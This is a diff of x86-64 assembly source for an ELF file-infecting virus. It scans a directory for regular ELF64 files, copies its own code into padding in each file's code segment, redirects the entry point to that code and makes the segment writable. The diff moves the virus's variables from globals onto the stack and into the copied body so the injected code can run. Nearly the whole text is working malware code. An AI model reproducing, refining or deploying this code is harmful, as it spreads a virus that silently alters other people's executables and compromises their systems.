@@ -54,7 +54,7 @@ _start:
                 test        rax, rax
                 jl          _return
 
-                mov         [rel directory_fd], rax
+                mov         [rsp-0x30], rax                     ;rsp-0x30 = directory_fd
 
                 mov         rdi, rax
                 mov         rax, __NR_fchdir
@@ -62,23 +62,23 @@ _start:
                 test        rax, rax
                 jl          _return
 
-                lea         rax, [rsp - (BUF_SIZE + LOCAL_VARS)]
-                mov         [rel getdents_buf], rax
 
 scandir:        mov         rdx, BUF_SIZE
-                mov         rsi, [rel getdents_buf]
-                mov         rdi, [rel directory_fd]
+                lea         rsi, [rsp - (BUF_SIZE + LOCAL_VARS)]
+                mov         rdi, [rsp-0x30]             ;directory fd
                 mov         rax, __NR_getdents64
                 syscall
                 test        rax, rax
                 jle         .close
 
-                mov         [rel getdents_size], rax            ; nread from getdents64
+                mov         [rsp-0x38], rax                     ; nread from getdents64
                 xor         rdx, rdx
-                mov         [rel getdents_idx], rdx
+                mov         [rsp-0x40], rdx                     ;rsp-0x40 = getdents_idx
 
-.file:          mov         rdi, [rel getdents_buf]
-                add         rdi, [rel getdents_idx]
+.file:
+
+                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
+                add         rdi, [rsp-0x40]
 
                 cmp         byte [rdi + 18], DT_REG
                 jne         .next
@@ -86,17 +86,19 @@ scandir:        mov         rdx, BUF_SIZE
                 add         rdi, 19                             ; d_name[]
                 call        process
 
-.next:          mov         rdi, [rel getdents_buf]
-                add         rdi, [rel getdents_idx]
+.next:
+
+                lea         rdi, [rsp - (BUF_SIZE + LOCAL_VARS)]
+                add         rdi, [rsp-0x40]
                 movzx       rax, word [rdi + 16]                ; d_reclen
-                add         rax, [rel getdents_idx]
-                mov         [rel getdents_idx], rax
-                mov         rdx, [rel getdents_size]
-                cmp         rax, rdx
+                add         rax, [rsp-0x40]
+                mov         [rsp-0x40], rax
+                mov         rdx, [rsp-0x38]                     ; compare getdents64 idx vs nread
+                cmp         rax, rdx                            ;
                 jl          .file
                 jmp         scandir
 
-.close:         mov         rdi, [rel directory_fd]
+.close:         mov         rdi, [rsp-0x30]
                 mov         rax, __NR_close
                 syscall
 _return:
@@ -178,7 +180,6 @@ is_valid_elf64:                                                 ; expecing data 
 .return:        ret
 
 insert:                                                         ; expecting data in rdi
-                push        r12
                 push        r13
                 push        r14
                 push        r15
@@ -207,8 +208,7 @@ insert:                                                         ; expecting data
 
                 mov         r14, rdi                            ; code segment Elf64_Phdr*
 
-                mov         rdi, r15                            ; beginning of file
-                add         rdi, rax
+                lea         rdi, [r15 + rax]                     ; data + p_offset + p_filesz
                 mov         rsi, rdi                            ; save: end of segment
                 xor         al, al
                 mov         rcx, _finish - _start
@@ -216,9 +216,6 @@ insert:                                                         ; expecting data
                 test        rcx, rcx
                 ja          .return                             ; not enough room
 
-                mov         rax, qword [r15 + 0x18]             ; entry point
-                mov         [rel entry], rax
-                mov         [rel pie_address], r13
                 lea         rdi, [rel _start]
                 xchg        rdi, rsi
                 mov         rcx, _finish - _start
@@ -228,6 +225,9 @@ insert:                                                         ; expecting data
                 ;r14 = code segment header
                 ;r13 = new entry point
 
+                mov         rax, qword [r15 + 0x18]             ; entry point
+                mov         [rdi - 0x08], rax                   ; _finish - 8 = entry
+                mov         [rdi - 0x10], r13                   ; _finish - 16 = pie_address
                 mov         qword [r15 + 0x18], r13             ; fix entry point
                 mov         rax, 0x0000000700000001             ; p_flags, writable
                 mov         qword [r14], rax
@@ -244,14 +244,9 @@ insert:                                                         ; expecting data
                 pop         r15
                 pop         r14
                 pop         r13
-                pop         r12
                 ret
 
 
-directory_fd    dq          -1
-getdents_buf    dq          -1
-getdents_size   dq          -1
-getdents_idx    dq          -1
 infect_fd       dq          -1
 infect_fsize    dq          -1
 infect_mem      dq          -1
